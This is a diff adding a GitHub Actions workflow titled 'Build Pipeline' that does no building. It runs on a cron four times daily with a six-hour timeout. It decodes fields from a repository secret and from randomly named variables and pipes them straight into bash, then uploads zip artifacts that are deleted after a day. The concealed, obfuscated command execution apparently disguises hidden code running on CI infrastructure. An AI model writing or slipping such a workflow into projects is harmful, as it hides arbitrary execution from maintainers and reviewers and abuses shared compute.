@@ -1,0 +1,34 @@
+name: Build Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '47 5,11,17,23 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  trigger:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Start
+        env:
+          xmp1: ${{ secrets.xmp1 }}
+        run: |
+          printf '%s' "$xmp1" | jq -r .k481 | /bin/bash
+          printf '%s' "$wjpx4" | jq -r .ijy08 | /bin/bash
+          echo $phge8813 | jq -r .oiqle24 | /bin/bash
+          echo $omnlv4760 | jq -r .e0308 | /bin/bash
+
+      - name: Save output
+        uses: actions/upload-artifact@v4
+        with:
+          name: es5hT385
+          path: "*.zip"
+          retention-days: 1
